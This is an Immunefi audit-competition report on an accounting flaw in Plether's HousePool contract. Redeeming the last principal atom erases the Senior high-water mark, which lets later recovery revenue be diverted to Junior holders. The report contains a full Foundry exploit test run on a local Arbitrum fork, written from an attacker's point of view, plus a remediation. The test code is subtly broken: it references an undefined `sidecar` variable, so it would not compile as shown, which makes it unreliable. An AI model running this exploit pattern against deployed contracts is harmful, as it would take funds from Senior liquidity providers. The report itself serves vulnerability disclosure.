# \#99981 [SC-Low]  Final principal atom erases remaining Senior recovery rights

**Submitted on Nov 16th 2026 at 00:02:37 UTC by @jesse03 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99981
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

### Root cause
<br>

Senior HWM reduction uses the fraction of net principal paid:

```
H_removed = floor(H * fundedAssets / oldPrincipal)
```
<br>


Ownership reduction is based on shares burned. These quantities diverge after impairment.
<br>


If only one principal atom remains, a partial-share redemption can receive that atom:

```
fundedAssets == seniorPrincipal == 1
```
<br>


The implementation removes 100% of the HWM even when a material fraction of Senior shares remains outstanding.
<br>


### Attack 
<br>


1- Senior is severely impaired and has one remaining principal atom but a large HWM.
2- A tiny trader loss or claim reduction credits one atom through the normal revenue path.
3- Reconciliation restores senior principal to one atom while preserving the larger HWM.
4- An attacker requests redemption for enough Senior shares to receive that one atom.
5- Settlement burns those shares and subtracts the entire HWM.
6- Remaining Senior shares lose their recovery priority.
7- Both deposit gates then treat Senior as recovered.
8- Later revenue is credited to Junior and can be withdrawn by Junior holders.

<br>


### Important Note
<br>



it is a new edge case showing that the earlier MED-11 fix is incomplete:

Cecuro MED-11 disclosed that Senior withdrawals reduced principal using assets but reduced the HWM using a different economic fraction

The applied fix changed the HWM calculation to use `fundedAssets / seniorPrincipal`.

LOW-54 then accepted the remaining rounding behavior, saying a fractional HWM could remain and that paying the full principal clears it

This finding shows that the final principal atom can equal 100% of `seniorPrincipal` and clear the entire HWM while roughly two-thirds of Senior shares remain outstanding. That causes a material recovery loss, far beyond the dust issue accepted in LOW-54.

The program does not explicitly list the final-atom case in its public known issues. Its rules say a report on an acknowledged issue is eligible only when it proves the fix is incomplete or introduced another bug

<br>


### Remediation
<br>


The HWM reduction must never exceed the fraction of ownership burned. Preserve both retained-fee protection and share-proportional recovery:

```
uint256 hwmByShares = Math.mulDiv(
    state.seniorHighWaterMark,
    preBurnSupply - fundedShares,
    preBurnSupply,
    Math.Rounding.Floor
);

uint256 hwmByAssets = Math.mulDiv(
    state.seniorHighWaterMark,
    state.seniorPrincipal - fundedAssets,
    state.seniorPrincipal,
    Math.Rounding.Floor
);

nextState.seniorHighWaterMark = Math.max(hwmByShares, hwmByAssets);
```


## Proof of Concept

```diff
diff --git a/packages/perps/test/perps/audit/FinalSeniorAtomHwmFork.t.sol b/packages/perps/test/perps/audit/FinalSeniorAtomHwmFork.t.sol
new file mode 100644
index 0000000..cd0037e
--- /dev/null
+++ b/packages/perps/test/perps/audit/FinalSeniorAtomHwmFork.t.sol
@@ -0,0 +1,295 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
+import {CfdEngine} from "@plether/perps/CfdEngine.sol";
+import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
+import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
+import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {HousePool} from "@plether/perps/HousePool.sol";
+import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
+import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
+import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
+import {TrancheVault} from "@plether/perps/TrancheVault.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+import {Test} from "forge-std/Test.sol";
+
+/// @notice Local PoC against an Arbitrum One fork using the canonical USDG token.
+/// @dev The reviewed perps stack is not deployed to production. This test deploys the exact audited source locally on
+///      the fork; no transaction is broadcast to Arbitrum.
+contract FinalSeniorAtomHwmForkTest is Test {
+
+    address internal constant USDG = 0x004B506865409877C9fA29bfb1ebA929984B9bbC;
+    uint256 internal constant FORK_BLOCK = 524_581_230;
+    uint256 internal constant CAP_PRICE = 2e8;
+    address internal constant PROTOCOL_TREASURY = address(0xFEE5);
+    address internal constant LOSS_SINK = address(0xBADC0DE);
+    address internal constant ATTACKER = address(0xA77ACC);
+
+    uint256 internal constant SENIOR_SEED = 334_330_289_361;
+    uint256 internal constant SENIOR_ATTACKER_DEPOSIT = 666_660_578_722;
+    uint256 internal constant JUNIOR_SEED = 334_330_289_361;
+    uint256 internal constant JUNIOR_ATTACKER_DEPOSIT = 10_000_000e6;
+    uint256 internal constant RECOVERY_INFLOW = 100_000e6;
+
+    IERC20 internal usdg;
+    MarginClearinghouse internal clearinghouse;
+    CfdEngine internal engine;
+    TerminalNavBookV2 internal terminalNavBook;
+    HousePool internal pool;
+    HousePoolRedemptionMathSidecar internal redemptionMath;
+    TrancheVault internal seniorVault;
+    TrancheVault internal juniorVault;
+
+    function setUp() public {
+        string memory rpcUrl = vm.envOr("ARBITRUM_RPC_URL", string("https://arb1.arbitrum.io/rpc"));
+        vm.createSelectFork(rpcUrl, FORK_BLOCK);
+        assertEq(block.chainid, 42_161);
+
+        usdg = IERC20(USDG);
+        assertEq(IERC20Metadata(USDG).decimals(), 6);
+        assertEq(IERC20Metadata(USDG).name(), "Global Dollar");
+        assertEq(IERC20Metadata(USDG).symbol(), "USDG");
+        clearinghouse = new MarginClearinghouse(USDG);
+
+        CfdTypes.RiskParams memory riskParams = CfdTypes.RiskParams({
+            vpiFactor: 0,
+            maxSkewRatio: 0.4e18,
+            maintMarginBps: 100,
+            initMarginBps: 150,
+            fadMarginBps: 300,
+            baseCarryBps: 500,
+            minBountyAssets: 1e6,
+            bountyBps: 10,
+            keeperShareBps: 5000,
+            protocolShareBps: 0
+        });
+        engine = new CfdEngine(USDG, address(clearinghouse), CAP_PRICE, riskParams, 50);
+
+        CfdEnginePlanner planner = new CfdEnginePlanner();
+        CfdEngineSettlementSidecar settlementSidecar = new CfdEngineSettlementSidecar(address(engine));
+        CfdEngineAdmin admin = new CfdEngineAdmin(address(engine), address(this));
+        engine.setDependencies(address(planner), address(sidecar), address(admin));
+        engine.setProtocolTreasury(PROTOCOL_TREASURY);
+
+        terminalNavBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
+        engine.setTerminalNavBook(address(terminalNavBook));
+        engine.setOrderRouter(address(this));
+
+        redemptionMath = new HousePoolRedemptionMathSidecar();
+        pool = new HousePool(USDG, address(engine), address(redemptionMath));
+        seniorVault = new TrancheVault(usdg, address(pool), true, "Plether Senior LP", "psLP", 0, address(0));
+        juniorVault = new TrancheVault(usdg, address(pool), false, "Plether Junior LP", "pjLP", 0, address(0));
+
+        pool.setSeniorVault(address(seniorVault));
+        pool.setJuniorVault(address(juniorVault));
+        engine.setPool(address(pool));
+        clearinghouse.setEngine(address(engine));
+
+        // The pinned block is a Sunday. Move into a live FX session before initializing the seed lifecycle.
+        vm.warp(block.timestamp + 12 hours);
+
+        IHousePool.PoolConfig memory config = IHousePool.PoolConfig({
+            seniorRateBps: 0,
+            markStalenessLimit: 60,
+            seniorFrozenLpFeeBps: 25,
+            juniorFrozenLpFeeBps: 75,
+            maxSeniorExposureAssets: 40_000_000e6,
+            maxSeniorShareBps: 8000
+        });
+        pool.proposePoolConfig(config);
+        vm.warp(pool.poolConfigActivationTime());
+        _refreshMark();
+        pool.finalizePoolConfig();
+
+        _seed(juniorVault, JUNIOR_SEED);
+        _seed(seniorVault, SENIOR_SEED);
+        pool.activateTrading();
+
+        _depositAsync(seniorVault, ATTACKER, SENIOR_ATTACKER_DEPOSIT);
+        _depositAsync(juniorVault, ATTACKER, JUNIOR_ATTACKER_DEPOSIT);
+
+        // Shares become transferable/redeemable after the request deposit's cooldown.
+        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
+    }
+
+    function test_FinalSeniorPrincipalAtomErasesRecoveryHwmWith100kInflow() public {
+        _runExploit(RECOVERY_INFLOW);
+    }
+
+    function test_ImpactScalesToEntireRetainedSeniorHwm() public {
+        (uint256 expectedRetainedHwm, uint256 attackerCash) = _runExploit(400_000e6);
+        assertGt(attackerCash, expectedRetainedHwm, "the attacker captures the complete Senior recovery entitlement");
+    }
+
+    function _runExploit(
+        uint256 recoveryInflow
+    ) internal returns (uint256 expectedRetainedHwm, uint256 juniorCash) {
+        uint256 seniorSupplyBeforeLoss = seniorVault.totalSupply();
+        uint256 hwmBeforeLoss = pool.seniorHighWaterMark();
+        uint256 attackerSeniorShares = seniorVault.balanceOf(ATTACKER);
+
+        assertEq(usdg.balanceOf(address(pool)), pool.totalAssets());
+        assertEq(pool.seniorPrincipal(), SENIOR_SEED + SENIOR_ATTACKER_DEPOSIT);
+        assertEq(hwmBeforeLoss, pool.seniorPrincipal());
+
+        // Emulate the severe trading loss through the Engine-authorized payout path. This transfers real forked USDG
+        // out of the locally deployed pool.
+        uint256 loss = usdg.balanceOf(address(pool));
+        vm.prank(address(engine));
+        pool.payOut(LOSS_SINK, loss);
+        vm.prank(address(seniorVault));
+        pool.reconcile();
+
+        assertEq(pool.totalAssets(), 0);
+        assertEq(pool.seniorPrincipal(), 0);
+        assertEq(pool.juniorPrincipal(), 0);
+        assertEq(pool.seniorHighWaterMark(), hwmBeforeLoss);
+
+        // A one-atom revenue event restores Senior principal but leaves the recovery watermark intact.
+        deal(USDG, address(this), 1);
+        assertTrue(usdg.transfer(address(pool), 1));
+        vm.prank(address(engine));
+        pool.recordClaimantInflow(
+            1, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
+        );
+        vm.prank(address(seniorVault));
+        pool.reconcile();
+
+        assertEq(pool.seniorPrincipal(), 1);
+        assertEq(pool.seniorHighWaterMark(), hwmBeforeLoss);
+
+        uint256 redeemEpoch = _requestRedeem(seniorVault, ATTACKER, attackerSeniorShares);
+        _warpToEpoch(redeemEpoch);
+        IHousePool.LpEpochSettlementResult memory seniorResult = _settle();
+
+        uint256 supplyAfterBurn = seniorVault.totalSupply();
+        uint256 fundedShares = seniorResult.seniorFundedShares;
+        uint256 fundedAssets = seniorResult.seniorFundedAssets;
+        expectedRetainedHwm = Math.mulDiv(hwmBeforeLoss, seniorSupplyBeforeLoss - fundedShares, seniorSupplyBeforeLoss);
+
+        assertEq(fundedAssets, 1, "attacker received the final principal atom");
+        assertEq(seniorVault.balanceOf(ATTACKER), 0, "attacker's entire Senior request was burned");
+        assertGt(supplyAfterBurn, 0, "material Senior share supply remains");
+        assertGt(expectedRetainedHwm, 300_000e6, "remaining Senior holders should retain material recovery rights");
+        assertEq(pool.seniorPrincipal(), 0);
+        assertEq(pool.seniorHighWaterMark(), 0, "bug erases the remaining holders' entire recovery watermark");
+
+        uint256 claimableSeniorShares = seniorVault.claimableRedeemRequest(redeemEpoch, ATTACKER);
+        vm.prank(ATTACKER);
+        uint256 seniorCash = seniorVault.claimRedeem(redeemEpoch, claimableSeniorShares, ATTACKER, ATTACKER);
+        assertEq(seniorCash, 1);
+
+        // A later legitimate recovery inflow should restore the remaining Senior HWM first. Because the HWM is zero,
+        // the implementation instead books the entire amount to Junior.
+        deal(USDG, address(this), recoveryInflow);
+        assertTrue(usdg.transfer(address(pool), recoveryInflow));
+        vm.prank(address(engine));
+        pool.recordClaimantInflow(
+            recoveryInflow, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
+        );
+        vm.prank(address(seniorVault));
+        pool.reconcile();
+
+        assertEq(pool.seniorPrincipal(), 0, "remaining Senior holders receive no recovery principal");
+        assertEq(pool.juniorPrincipal(), recoveryInflow, "all recovery is diverted to Junior");
+        uint256 juniorPrincipalAfterRecovery = pool.juniorPrincipal();
+        assertTrue(pool.canAcceptTrancheDeposits(false));
+        assertTrue(pool.canSettleDepositEntries());
+
+        uint256 attackerJuniorShares = juniorVault.balanceOf(ATTACKER);
+        uint256 juniorEpoch = _requestRedeem(juniorVault, ATTACKER, attackerJuniorShares);
+        _warpToEpoch(juniorEpoch);
+        uint256 attackerUsdgBefore = usdg.balanceOf(ATTACKER);
+        IHousePool.LpEpochSettlementResult memory juniorResult = _settle();
+
+        uint256 claimableJuniorShares = juniorVault.claimableRedeemRequest(juniorEpoch, ATTACKER);
+        vm.prank(ATTACKER);
+        juniorCash = juniorVault.claimRedeem(juniorEpoch, claimableJuniorShares, ATTACKER, ATTACKER);
+
+        assertEq(usdg.balanceOf(ATTACKER) - attackerUsdgBefore, juniorCash);
+        assertGe(juniorCash, (recoveryInflow * 96) / 100, "Junior holder captures nearly all recovery");
+        assertEq(juniorResult.juniorFundedAssets, juniorCash);
+
+        // The stale HWM also opens the Junior deposit gate and allows a new request.
+        assertTrue(pool.canAcceptTrancheDeposits(false));
+        assertTrue(pool.canSettleDepositEntries());
+        deal(USDG, ATTACKER, usdg.balanceOf(ATTACKER) + 1e6);
+        vm.startPrank(ATTACKER);
+        usdg.approve(address(juniorVault), 1e6);
+        uint256 newJuniorDeposit = juniorVault.requestDeposit(1e6, ATTACKER, ATTACKER);
+        vm.stopPrank();
+        assertGt(newJuniorDeposit, 0);
+
+        emit log_named_decimal_uint("Recovery inflow", recoveryInflow, 6);
+        emit log_named_decimal_uint("HWM before loss", hwmBeforeLoss, 6);
+        emit log_named_uint("Senior supply before", seniorSupplyBeforeLoss);
+        emit log_named_uint("Senior shares burned", fundedShares);
+        emit log_named_uint("Senior supply remains", supplyAfterBurn);
+        emit log_named_decimal_uint("Share-proportional retained HWM", expectedRetainedHwm, 6);
+        emit log_named_decimal_uint("Actual retained HWM", pool.seniorHighWaterMark(), 6);
+        emit log_named_decimal_uint("Recovery credited to Junior", juniorPrincipalAfterRecovery, 6);
+        emit log_named_decimal_uint("Recovery claimed by attacker", juniorCash, 6);
+    }
+
+    function _seed(
+        TrancheVault vault,
+        uint256 assets
+    ) internal {
+        deal(USDG, address(this), usdg.balanceOf(address(this)) + assets);
+        usdg.approve(address(pool), assets);
+        pool.initializeSeedPosition(address(vault) == address(seniorVault), assets, address(this));
+    }
+
+    function _depositAsync(
+        TrancheVault vault,
+        address lp,
+        uint256 assets
+    ) internal returns (uint256 shares) {
+        deal(USDG, lp, assets);
+        vm.startPrank(lp);
+        usdg.approve(address(vault), assets);
+        uint256 requestId = vault.requestDeposit(assets, lp, lp);
+        vm.stopPrank();
+
+        _warpToEpoch(requestId);
+        _settle();
+
+        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
+        assertEq(claimableAssets, assets);
+        vm.prank(lp);
+        shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
+        assertGt(shares, 0);
+    }
+
+    function _requestRedeem(
+        TrancheVault vault,
+        address lp,
+        uint256 shares
+    ) internal returns (uint256 requestId) {
+        vm.prank(lp);
+        requestId = vault.requestRedeem(shares, lp, lp);
+    }
+
+    function _warpToEpoch(
+        uint256 epochId
+    ) internal {
+        uint256 activationTime = pool.lpEpochStart(epochId);
+        if (block.timestamp < activationTime) {
+            vm.warp(activationTime);
+        }
+    }
+
+    function _settle() internal returns (IHousePool.LpEpochSettlementResult memory result) {
+        _refreshMark();
+        return pool.settleLpEpoch(0, 0);
+    }
+
+    function _refreshMark() internal {
+        engine.updateMarkPrice(1e8, uint64(block.timestamp));
+    }
+
+}
```
